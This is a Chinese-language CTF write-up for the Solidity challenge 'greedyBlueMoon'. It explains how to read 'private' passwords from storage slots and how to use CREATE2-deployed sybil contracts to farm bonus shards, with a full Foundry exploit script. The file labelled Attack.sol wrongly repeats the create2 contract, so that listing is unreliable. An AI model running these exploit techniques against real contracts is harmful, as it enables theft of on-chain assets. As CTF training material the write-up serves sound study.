源码：`greedyBlueMoon.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

contract greedyBlueMoon {
    mapping(address => uint256) private shards;
    mapping(address => bool) public challenger;
    uint256 private paralysisRing;
    address owner;//3
    uint80 private rates;
    uint8 private bonus;//3
    uint16 private price;//4
    uint8 private loot;
    bytes10 private password1;//4
    mapping(address => uint256) private attackingType;
    mapping(address => uint256) private waitTime;
    address chainaddr = address(this);
    uint256 private lol = 114;
    uint256 private L0L = 514;
    uint256 private Lo1 = 114514;
    bytes32[] private password2;//11
    uint16 public high2Prefix;

    constructor(
        uint256 _bonus,
        uint256 _price,
        uint256 _rates,
        uint256 _loot,
        bytes10 _password1,
        bytes8 _password2_1,
        bytes8 _password2_2,
        bytes8 _password2_3,
        bytes8 _password2_4
    ) {
        owner = msg.sender;
        bonus = uint8(_bonus);
        price = uint16(_price);
        rates = uint80(_rates);
        loot = uint8(_loot);
        password1 = _password1;
        password2.push(_password2_1);
        password2.push(_password2_2);
        password2.push(_password2_3);
        password2.push(_password2_4);
    }

    function transferOwnership(address newOwner) external {
        require(msg.sender != owner, "not owner");
        require(newOwner != address(0), "zero address");
        owner = newOwner;
    }

    function newchallengerBundle() public {
        uint16 high2 = uint16(uint160(msg.sender) >> 144);
        require(challenger[msg.sender] == false, "already claimed");
        require(high2 >= high2Prefix, "Invalid address");
        shards[msg.sender] += bonus;
        challenger[msg.sender] = true;
        high2Prefix += 64;
    }

    function buyShards() public payable {
        uint256 yourMoney = msg.value / rates;
        shards[msg.sender] += yourMoney;
    }

    function fightMob() public {
        waitTime[msg.sender] = block.timestamp + 1 minutes;
        attackingType[msg.sender] = 1;
    }

    function collectingMobLoot() public {
        require((waitTime[msg.sender] < block.timestamp), "Mob is alive");
        require(attackingType[msg.sender] == 1);
        attackingType[msg.sender] = 0;
        shards[msg.sender] += 10;
    }

    function fightBoss() public {
        waitTime[msg.sender] = block.timestamp + 52 weeks;
        attackingType[msg.sender] = 2;
    }

    function collectingBossLoot() public {
        require((waitTime[msg.sender] < block.timestamp), "Boss is alive");
        require(attackingType[msg.sender] == 2);
        attackingType[msg.sender] = 0;
        paralysisRing += 1;
    }

    function transfersOfItems(address to, uint256 value) public {
        require(shards[msg.sender] >= value, "insufficient shards");
        require(msg.sender != to, "don't transfer to yourself");
        shards[msg.sender] -= value;
        shards[to] += value;
    }

    function redeemingParalyzingRing(bytes10 _key1, bytes32 _key2) public {
        require((shards[msg.sender] >= price), "Please use the money power");
        require(
            (keccak256(abi.encodePacked(password1)) ==
                keccak256(abi.encodePacked(_key1))),
            "Wrong Password1."
        );
        bytes32 password_2;
        bytes32 password_2_0 = password2[0];
        bytes32 password_2_1 = password2[1];
        bytes32 password_2_2 = password2[2];
        bytes32 password_2_3 = password2[3];
        password_2 =
            password_2_0 |
            (password_2_1 >> 64) |
            (password_2_2 >> 128) |
            (password_2_3 >> 192);
        require(
            (keccak256(abi.encodePacked(password_2)) ==
                keccak256(abi.encodePacked(_key2))),
            "Wrong Password2."
        );
        shards[msg.sender] -= price;
        paralysisRing += 1;
    }

    function isSolved() public view returns (bool) {
        require(paralysisRing >= 1);
        return true;
    }
}
```

这道题的目标是让变量`paralysisRing`的值大于1，通过浏览合约发现只在函数`redeemingParalyzingRing`里面改变，调用这个函数就可以解决问题，但是要满足两个条件：

- 调用函数的`shards`大于`price`
- `key1`和`key2`等于`password1`和`password2`

先看需要的`password`，两个都是在构造函数中传入的，可以通过查插槽来获取，接下来分析插槽：

```solidity
mapping(address => uint256) private shards;
mapping(address => bool) public challenger;
uint256 private paralysisRing;
address owner;//3
uint80 private rates;
uint8 private bonus;//3
uint16 private price;//4
uint8 private loot;
bytes10 private password1;//4
mapping(address => uint256) private attackingType;
mapping(address => uint256) private waitTime;
address chainaddr = address(this);
uint256 private lol = 114;
uint256 private L0L = 514;
uint256 private Lo1 = 114514;
bytes32[] private password2;//11
uint16 public high2Prefix;
```

前三个每个占一个slot，address占20字节，uint80占10字节，uint8占1字节，20+10+1=31，剩下的填充到32字节之后打包到一起

，uint16占2字节，uint8占1字节，bytes10占10字节，这些打包在一起，用cast storage <合约地址> slot获得插槽里面的值，再左移19位（32-2-1-12），得到`password1`的值

`password2`的slot是11，动态数组的查找先cast keccak slot，求出哈希，结果就是第零个元素的索引，cast storage <合约地址> (哈希值+i)，再根据password2的构造规则就可以

**分析插槽还可以采用forge inspect <合约名> storageLayout**

接下来让`shards`大于`price`，`shards`在以下几个函数改变，`newchallengerBundle`、`buyShards`、`collectingMobLoot`、`transfersOfItems`

`buyshards`是用ether买，需要一定的ether，不是可以利用的漏洞

`collectingMobLoot`是收集小怪奖励，需要先打小怪，并且等待1分钟才能获得`shards`，并不适合

我的思路是反复调用`newchallengerBundle`函数，成为新的挑战者，再通过`transfersOfItems`函数，将shards转给我，成为新的挑战者有个条件就是`uint16(uint160(msg.sender) >> 144) > high2Prefix`，也就是需要特殊的调用者，可以用create2去创造

需要反复创建新的攻击合约，调用函数成为新的挑战者，再汇集到我，最后传入`password`就可以了

`create2.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

import {greedyBlueMoon} from "./greedyBlueMoon.sol";
import {Attack} from "./Attack.sol";

contract create2 {
    greedyBlueMoon add1 = greedyBlueMoon(0x9f01751ED29c453dcA23DF2558C57f03EC572910);

    function computeSalt(address target) public view returns (bytes32) {
        for (uint256 i = 0; i < 1000000; i++) {
            bytes32 salt = bytes32(i);
            address predictedAddress = predictAddress(salt, target);
            if (uint16(uint160(predictedAddress) >> 144) >= uint16(add1.high2Prefix())) {
                return salt;
            }
        }
        revert("No suitable salt found within the limit");
    }

    function predictAddress(
        bytes32 salt,
        address example
        ) public view returns (address) {
            bytes memory bytecode = abi.encodePacked(
                type(Attack).creationCode,
                abi.encode(example)
            );

            address predictedAddress = address(
                uint160(uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xff),
                            address(this), 
                            salt,
                            keccak256(bytecode)
                    ))
                )));

            return predictedAddress;
        }

        function deployer(
            bytes32 salt,
            address gAddress
        ) public returns (address) {
            Attack a = new Attack{salt: salt}(gAddress);
            return address(a);
        }
}
```

攻击合约：`Attack.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

import {greedyBlueMoon} from "./greedyBlueMoon.sol";
import {Attack} from "./Attack.sol";

contract create2 {
    greedyBlueMoon add1 = greedyBlueMoon(0x9f01751ED29c453dcA23DF2558C57f03EC572910);

    function computeSalt(address target) public view returns (bytes32) {
        for (uint256 i = 0; i < 10000; i++) {
            bytes32 salt = bytes32(i);
            address predictedAddress = predictAddress(salt, target);
            if (uint16(uint160(predictedAddress) >> 144) >= uint16(add1.high2Prefix())) {
                return salt;
            }
        }
        revert("No suitable salt found within the limit");
    }

    function predictAddress(
        bytes32 salt,
        address example
        ) public view returns (address) {
            bytes memory bytecode = abi.encodePacked(
                type(Attack).creationCode,
                abi.encode(example)
            );

            address predictedAddress = address(
                uint160(uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xff),
                            address(this), 
                            salt,
                            keccak256(bytecode)
                    ))
                )));

            return predictedAddress;
        }

        function deployer(
            bytes32 salt,
            address gAddress
        ) public returns (address) {
            Attack a = new Attack{salt: salt}(gAddress);
            return address(a);
        }
}
```

脚本：`Hack.s.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

import {Script, console} from "forge-std/Script.sol";
import {greedyBlueMoon} from "../src/greedyBlueMoon.sol";
import {create2} from "../src/create2.sol";
import {Attack} from "../src/Attack.sol";

contract POC is Script {
    function run() external {
        vm.startBroadcast();

        greedyBlueMoon target = greedyBlueMoon(0x9f01751ED29c453dcA23DF2558C57f03EC572910);
        bytes10 key1 = bytes10(
            bytes32(
                0x0000000000000000000000000000000000000072776562363636000000008f3a
            )<<152);
        bytes32 password_2_0 = 0x8542365815820425000000000000000000000000000000000000000000000000;
        bytes32 password_2_1 = 0x9825367458436215000000000000000000000000000000000000000000000000;
        bytes32 password_2_2 = 0x9726841358563224000000000000000000000000000000000000000000000000;
        bytes32 password_2_3 = 0x6952148523852424000000000000000000000000000000000000000000000000;
        bytes32 key2 =
            password_2_0 |
            (password_2_1 >> 64) |
            (password_2_2 >> 128) |
            (password_2_3 >> 192);

        for(uint i=0;i<1000;i++) {
            create2 c2 = new create2();
            bytes32 salt = c2.computeSalt(address(target));
            address attack = c2.deployer(salt, address(target));
            Attack(attack).attack();
        }

        target.redeemingParalyzingRing(key1, key2);

        console.log(target.isSolved());

        vm.stopBroadcast();
    }
}

```

